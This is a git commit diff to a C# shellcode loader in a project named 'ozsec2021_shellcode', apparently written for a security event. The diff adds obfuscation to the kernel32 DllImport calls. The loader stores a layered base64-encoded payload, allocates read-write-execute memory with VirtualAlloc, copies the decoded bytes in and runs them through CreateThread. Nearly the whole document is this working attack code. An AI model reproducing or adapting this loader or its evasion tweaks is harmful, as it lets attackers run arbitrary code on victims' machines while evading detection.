4188dddd85381d9fd32c98fe2d659dd466f899b2
dead-jaskier <symon3@protonmail.com>
2021-10-20 23:03:24 -0500

    Obfuscated DLLImport call

--- ozsec2021_shellcode/Program.cs
+++ ozsec2021_shellcode/Program.cs
@@ -8,6 +8,7 @@ namespace koby
     {
         public class Jaskier
         {
+            private static string kernel32 = "kernel32";
             private static string thisisthethingthatisgonnagivemecontrol = "VFVob2JGbHBkM2RsUkVsNlRFUkNORTVYU1hOTlNHYzBUMU4zZDJWSFVtMU1SRUkwV1dwQmMwMUlaekphVTNkM1pVZGFha3hFUWpSWlYxVnpUVWhuTTA1VGQzZGxSMXByVEVSQ05FOUVhM05OU0dodFQxTjNkMlZFWnpWTVJFSTBXa2RWYzAxSVp6UlpVM2QzWlVSQk1reEVRalJOZWtGelRVaG5kMDU1ZDNkbFJGRXpURVJDTkU1cVdYTk5TR2MwVFZOM2QyVkVUbTFNUkVJMFRYcFZjMDFJWnpOUFUzZDNaVVJqTUV4RVFqUk5SR2R6VFVobk1FNXBkM2RsUkdkM1RFUkNORTB5VlhOTlNHY3lXbE4zZDJWRVl6Rk1SRUkwV2xkVmMwMUlhR3haYVhkM1pVZFdhRXhFUWpSYWJWbHpUVWhvYkUxVGQzZGxSMVUwVEVSQ05GcEVaM05OU0dodFdtbDNkMlZIV20xTVJFSTBXbTFaYzAxSVozaE5lWGQzWlVSYWJFeEVRalJhVjFselRVaG9iVmxwZDNkbFJHeHFURVJDTkUxVVRYTk5TR2Q0VFhsM2QyVkVSWHBNUkVJMFRucE5jMDFJWnpWWlUzZDNaVWRaTWt4RVFqUk5ha2x6VFVob2FrMVRkM2RsUkdNelRFUkNORTlVWjNOTlNHY3dUVk4zZDJWRVNYcE1SRUkwVDFSbmMwMUlaekJOVTNkM1pVUkdiVXhFUWpSUFZHZHpUVWhuTUUxVGQzZGxSRUV6VEVSQ05FMVhUWE5OU0dob1RrTjNkMlZFVlRWTVJFSTBUWHBWYzAxSVp6VlBRM2QzWlVSWmVFeEVRalJOTWtselRVaG5lVTFwZDNkbFIxWnFURVJDTkUxcVNYTk5TR2hyVFhsM2QyVkhTbTFNUkVJMFRXMVpjMDFJWnpOTmFYZDNaVVJhYlV4RVFqUk5WRVZ6VFVobmVscHBkM2RsUkUxNlRFUkNORnBFU1hOTlNHaHJXWGwzZDJWRVJteE1SRUkwVFZSSmMwMUlhR3RPUTNkM1pVUldhRXhFUWpST2FsbHpUVWhvYlZsNWQzZGxSRkY0VEVSQ05FNUVVWE5OU0djMVQwTjNkMlZFVVhoTVJFSTBUVVJOYzAxSVp6VlBRM2QzWlVSVmVFeEVRalJOYlZselRVaG5lRTFwZDNkbFIwMTZURVJDTkU5VVozTk5TR2N4VFhsM2QyVkVXbWxNUkVJMFQxUlpjMDFJYUd0TmVYZDNaVVJaTTB4RVFqUk9WMWx6VFVobmVFMXBkM2RsUjAxNlRFUkNORTlVWjNOTlNHY3dXV2wzZDJWRVRYcE1SRUkwVFZSSmMwMUlhR3BOUTNkM1pVUnJORXhFUWpST1YwbHpUVWhuZDFscGQzZGxSRkY2VEVSQ05FOVVXWE5OU0docldWTjNkMlZFV1ROTVJFSTBUVzFaYzAxSVp6RlpVM2QzWlVSSmVVeEVRalJhVjAxelRVaG5OVTlEZDNkbFJFa3pURVJDTkU5VVozTk5TR2Q0VFdsM2QyVkhUVEZNUkVJMFRXcEpjMDFJYUd0TmVYZDNaVWRLYlV4RVFqUmFSRWx6VFVob2ExbDVkM2RsUkVac1RFUkNORTFVU1hOTlNHaHJUa04zZDJWRVNtbE1SRUkwV21wTmMwMUlaekpPYVhkM1pVZFZNMHhFUWpSTlZFRnpUVWhuTWxwVGQzZGxSMVpwVEVSQ05FMXFaM05OU0djeVdsTjNkMlZFVFROTVJFSTBUbXBaYzAxSWFHMU5lWGQzWlVSU2FVeEVRalJQVkdkelRVaG5NRmxwZDNkbFJFMHpURVJDTkUxVVNYTk5TR2hxVFVOM2QyVkVZekZNUkVJMFQxUm5jMDFJWjNoYWFYZDNaVVJWTkV4RVFqUlBWR2R6VFVobk1GbHBkM2RsUkVKdFRFUkNORTFVU1hOTlNHaHFUVU4zZDJWRWF6Uk1SRUkwVFZSamMwMUlaelZQUTNkM1pVUkZlVXhFUWpSWmVrMXpUVWhuTlZsVGQzZGxSRlV6VEVSQ05FMTZZM05OU0dkNlRubDNkMlZFVVRSTVJFSTBUa1JuYzAxSVp6Tk5hWGQzWlVSU2FFeEVRalJPUkd0elRVaG5NRTFwZDNkbFIxWnFURVJDTkZwcVRYTk5TR2N3V1dsM2QyVkVVbXBNUkVJMFRrUnJjMDFJWnpWUFEzZDNaVVJCZUV4RVFqUmFiVVZ6VFVobk5VMTVkM2RsUjFacVRFUkNORnBYVFhOTlNHaHNXWGwzZDJWRVVteE1SRUkwVGpKSmMwMUlaM2xOUTNkM1pVUkplRXhFUWpSTlZFMXpUVWhuZUUxNWQzZGxSR1JwVEVSQ05FNXFVWE5OU0djeVRVTjNkMlZFU1hoTVJFSTBUa2ROYzAxSVp6Qk9lWGQzWlVSa2FVeEVRalJPVjFselRVaG5NazVEZDNkbFJFMHhURVJDTkUxVVVYTk5TR2MxV1ZOM2QyVkhXbWxNUkVJMFdsZE5jMDFJYUdwTmVYZDNaVWRHYVV4RVFqUlBSRTF6VFVobmVFMXBkM2RsUkVWNlRFUkNORTFVVFhOTlNHZDZXVk4zZDJWSFVUTk1SRUkwVGtSamMwMUlaekJOZVhkM1pVUmthVXhFUWpSTk1rVnpUVWhuTlUxNWQzZGxSR00wVEVSQ05FMVVUWE5OU0doc1dYbDNkMlZIVFRKTVJFSTBUbnByYzAxSVozaFBVM2QzWlVSa2FVeEVRalJhUkUxelRVaG9hVmxwZDNkbFJFVjVURVJDTkU1WFNYTk5TR2N6V1dsM2QyVkVSWGhNUkVJMFRWUk5jMDFJWjNoT2FYZDNaVVJLYUV4RVFqUlBWMFZ6VFVob2JVNVRkM2RsUkZGNlRFUkNORTVFVFhOTlNHY3dUWGwzZDJWRVVYcE1SRUkwVGxSTmMwMUlaekJOZVhkM1pVUlZla3hFUWpST1JFMXpUVWhuTTFscGQzZGxSMWsxVEVSQ05FMVhUWE5OU0docVdYbDNkMlZIV1hwTVJFSTBXbGROYzAxSWFHcE9hWGQzWlVSbk1FeEVRalJPZW10elRVaG5kMDE1ZDNkbFJGRXhURVJDTkU1RVVYTk5TR2N6V1dsM2QyVkVhR2hNUkVJMFdXcFpjMDFJWnpKT2VYZDNaVVJqZVV4RVFqUmFWMDF6VFVob2FrNXBkM2RsUkdzeVRFUkNORnBFVFhOTlNHY3lUbmwzZDJWRVJUVk1SRUkwV2xkTmMwMUlaekZhUTNkM1pVUkdhVXhFUWpST2FsbHpUVWhvYlZwcGQzZGxSMXBwVEVSQ05FNTZVWE5OU0dkNFRYbDNkMlZFUlhwTVJFSTBUVlJOYzAxSVp6TlBVM2QzWlVSRmVreEVRalJPZW10elRVaG5lRTU1ZDNkbFJGRXhURVJDTkU1RVVYTk5TR2N6V1dsM2QyVkVSWGhNUkVJMFdUSkZjMDFJYUd0WmFYZDNaVVJTYWt4RVFqUmFWMDF6VFVob2FrNXBkM2RsUkd0M1RFUkNORnBYU1hOTlNHZDRUWGwzZDJWRVdtdE1SRUkwVFdwVmMwMUlaelZQUTNkM1pVUkpNVXhFUWpST2VtdHpUVWhuTVUxNWQzZGxSR1JwVEVSQ05FMVVUWE5OU0dkM1RYbDNkMlZFUlhwTVJFSTBUVlJOYzAxSVp6Qk9VM2QzWlVSak5VeEVRalJOVkUxelRVaG5NMWxwZDNkbFJGSnBURVJDTkZscVkzTk5TR2N3VFVOM2QyVkhXVEpNUkVJMFdsZE5jMDFJYUdwT2FYZDNaVVJuZDB4RVFqUk9SRUZ6VFVobk0wOVRkM2RsUkVWNlRFUkNORTVFVlhOTlNHY3dUVU4zZDJWRVVUQk1SRUkwVGpKSmMwMUlaM2hOVTNkM1pVZE9hRXhFUWpSYVIwbHpUVWhuTUZsNWQzZGxSMVpxVEVSQ05GbDZXWE5OU0djMVRVTjNkMlZIVm1sTVJFSTBUVlJOYzAxSVp6SmFVM2QzWlVST2FVeEVRalJPUjBselRVaG5NMWxwZDNkbFJFVjZURVJDTkU1VVRYTk5TR2Q0VFhsM2QyVkVSWHBNUkVJMFRucHJjMDFJWjNoTmVYZDNaVVJSZWt4RVFqUk9Na2x6VFVobmVFOURkM2RsUkU1cVRFUkNORTFYVFhOTlNHZDVUWGwzZDJWSFZtcE1SRUkwV1hwWmMwMUlaekJPUTNkM1pVUmthVXhFUWpST2FsbHpUVWhuTTFwRGQzZGxSRlpzVEVSQ05FNTZTWE5OU0doc1dYbDNkMlZIVFRKTVJFSTBUa2RSYzAxSVp6QmFRM2QzWlVkV2FreEVRalJOVjFselRVaG5lazU1ZDNkbFJFWnFURVJDTkU5VVdYTk5TR2N5VFhsM2QyVkhWbXBNUkVJMFdsZE5jMDFJYUd4WmVYZDNaVWRhYUV4RVFqUlBSR2R6VFVob2JGbDVkM2RsUjFacVRFUkNORnBYVFhOTlNHZDRUV2wzZDJWSFVYZE1SRUkwVFRKRmMwMUlhR3RPVTNkM1pVUlpNa3hFUWpSYVJFbHpUVWhvYTAxRGQzZGxSMFUwVEVSQ05GcFVUWE5OU0dob1RtbDNkMlZIU1hoTVJFSTBUa1JWYzAxSVp6TlBVM2QzWlVSRmVreEVRalJPUkVGelRVaG9iRmw1ZDNkbFIwMHlURVJDTkUxNlZYTk5TR2N6VDFF==";
             private static List<byte> shogun = new List<byte>() { 0x00 };
             
@@ -15,10 +16,10 @@ namespace koby
             private static UInt32 MEM_COMMIT = 0x1000;
             private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
             // create VirtualAlloc(), CreateThread() and WaitForSingleObject() references through DLLImport of 'kernel32' package
-            [Ihonestlycouldntthinkofabetteralias.DllImport("kernel32")]
+            [Ihonestlycouldntthinkofabetteralias.DllImport(nameof(kernel32))]
             private static extern UInt32 VirtualAlloc(UInt32 lump,
                     UInt32 lard, UInt32 fiction, UInt32 magic);
-            [Ihonestlycouldntthinkofabetteralias.DllImport("kernel32")]
+            [Ihonestlycouldntthinkofabetteralias.DllImport(nameof(kernel32))]
             private static extern IntPtr CreateThread(
                 UInt32 cucumber,
                 UInt32 october,
@@ -27,7 +28,7 @@ namespace koby
                 UInt32 weeb,
                 ref UInt32 toaster
                 );
-            [Ihonestlycouldntthinkofabetteralias.DllImport("kernel32")]
+            [Ihonestlycouldntthinkofabetteralias.DllImport(nameof(kernel32))]
             private static extern UInt32 WaitForSingleObject(
                 IntPtr kansas,
                 UInt32 nectar
@@ -47,14 +48,14 @@ namespace koby
                 funkydunky = VirtualAlloc(0, (UInt32)buzzLightyear.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                 Ihonestlycouldntthinkofabetteralias.Marshal.Copy(buzzLightyear, 0, (IntPtr)funkydunky, buzzLightyear.Length);
                 // set the pointer of thread
-                IntPtr givehead = IntPtr.Zero;
+                IntPtr giveThread = IntPtr.Zero;
                 // hold thread's id
                 UInt32 poptart = 0;
                 // store process info point
                 IntPtr cannabanna = IntPtr.Zero;
                 // Create the thread - Passing in TheadAttributes, Stack Size, Address, process info, creation flags and thread Id
-                givehead = CreateThread(0, 0, funkydunky, cannabanna, 0, ref poptart);
-                WaitForSingleObject(givehead, 0xFFFFFFFF);
+                giveThread = CreateThread(0, 0, funkydunky, cannabanna, 0, ref poptart);
+                WaitForSingleObject(giveThread, 0xFFFFFFFF);
             }
 
             private static void cantremembermydreams()
